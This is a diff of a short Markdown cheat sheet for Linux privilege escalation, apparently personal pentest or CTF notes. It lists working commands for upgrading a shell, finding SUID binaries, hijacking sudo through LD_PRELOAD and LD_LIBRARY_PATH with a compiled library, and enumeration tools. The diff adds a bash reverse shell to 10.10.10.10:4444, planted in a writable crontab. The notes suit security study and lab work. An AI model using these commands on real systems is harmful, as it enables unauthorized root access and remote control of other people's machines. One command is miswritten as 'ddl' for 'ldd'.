@@ -1,19 +1,19 @@
 # PrivEscalation
 
-1. Better listener shell experience
+### Better listener shell experience
 ```python -c 'import pty;pty.spawn("/bin/bash")'``` 
 
-2. List sudo capability of the current user
+### List sudo capability of the current user
 ```sudo -l```
 
-3. find interesting tools that can exploit shell
+### find interesting tools that can exploit shell
 ```find / -perm /6000 2>/dev/null | grep '/bin'```
 
-4. https://gtfobins.github.io/ followed the interesting tools that can exploit 
+### https://gtfobins.github.io/ followed the interesting tools that can exploit 
 
-5. env_keep exploit when sudo -l and ```ddl <thetargetedprogram>``` to find its libraries
+### env_keep exploit when sudo -l and ```ddl <thetargetedprogram>``` to find its libraries
 
-### Take advantage of LD_PRELOAD
+#### -Take advantage of LD_PRELOAD
 a. compile the library.
 ```gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/preload.c```
 ```#include <stdio.h>
@@ -30,7 +30,7 @@ void _init() {
 b. sudo program with the LD_PRELOAD
 ```sudo LD_PRELOAD=/tmp/preload.so program-name-here```
 
-### Take advantage of LD_LIBRARY_PATH
+#### -Take advantage of LD_LIBRARY_PATH
 a. find the libraries used by the program
 ```ldd /usr/sbin/<program> #for example```
 
@@ -50,8 +50,12 @@ void _init() {
 c. sudo program with the LD_LIBRARY_PATH
 ```sudo LD_LIBRARY_PATH=/tmp <programname>```
 
+### Cron job if it's writable on /etc/crontab file (can use any available type of reverse shell http://revshells.com/ ):
+```#!/bin/bash
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1```
 
-6. 
+
+7. 
 LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
 LinEnum: https://github.com/rebootuser/LinEnum
 LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
